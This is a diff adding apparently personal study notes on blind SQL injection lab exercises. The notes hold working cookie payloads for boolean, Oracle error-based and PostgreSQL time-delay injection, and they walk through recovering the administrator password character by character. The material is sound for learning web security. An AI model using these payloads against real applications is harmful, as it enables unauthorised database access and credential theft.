@@ -1,0 +1,44 @@
+
+1. - Blind SQL injection with conditional responses
+1.1
+    1- TrackingId=a' or 1=1 -- --> test if the param is vulnerable by showing 'Welcome back' msg
+    2- TrackingId=a' or 1=2 -- --> the msg does not appear. we can use this behaviour to exploit a blind sql injection
+    3- a' union select 'a' from users where username = 'administrator' -- --> the user admin exists
+    4- test the length of admin password
+        4.1 success for greater than 15 --> a'+union+select+'a'+from+users+where+username+=+'administrator'+and+length(password)+>+15+--
+        4.2 error for greater than 20 --> a'+union+select+'a'+from+users+where+username+=+'administrator'+and+length(password)+>+20+--
+                This means the password size is between 15 and 20
+        4.3 testing for length equal to 20 returns the msg
+            a'+union+select+'a'+from+users+where+username+=+'administrator'+and+length(password)+=+20+--
+
+    5- Need to test each password char by using substring. If there is a correct response it means the tested char is the correct one.
+        test the first char by using substring(password)
+        5.1 test if the char is greater than A 
+                a'+union+select+'a'+from+users+where+username+=+'administrator'+and+SUBSTRING(password,1,1)>'A'--
+            so or it is A or is a number
+        5.2 test if is a number 
+                a'+union+select+'a'+from+users+where+username+=+'administrator'+and+SUBSTRING(password,1,1)<'9'--
+            got a successfull answer
+                a'+union+select+'a'+from+users+where+username+=+'administrator'+and+SUBSTRING(password,1,1)<'0'--
+            Got an error, so the first char is a number
+        5.3 script conditional_blind_sql contais the exploit.
+
+2 - Blind SQL injection with conditional errors
+2.1 (looks an oracle DB)
+    1 - get error and no error response by changing the condition 1=1 to 1=2
+            a'+union+select+case+when+(1=1)+then+to_char(1/0)+else+null+end+from+dual--
+
+    2 - change the script to use this query and get the admin password
+
+3 - Blind SQL injection with time delays
+3.1 (this one seems a postgreSQL)
+    1 - the following payload trigger a sleep of 10 seconds
+            a'|| pg_sleep(10)--
+
+4 - Blind SQL injection with time delays and information retrieval
+4.1 - postgreSQL
+    1 - the payload needs to be url encoded to work (because of ';' --> %3b)
+            a'%3b+SELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+    2 - in the context of testing each passwrd char, the following query does the job:
+            a'%3b+SELECT+CASE+WHEN+((select count(username) from users where username = 'administrator' and substring(password,1,1)='A')=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+    3 - 
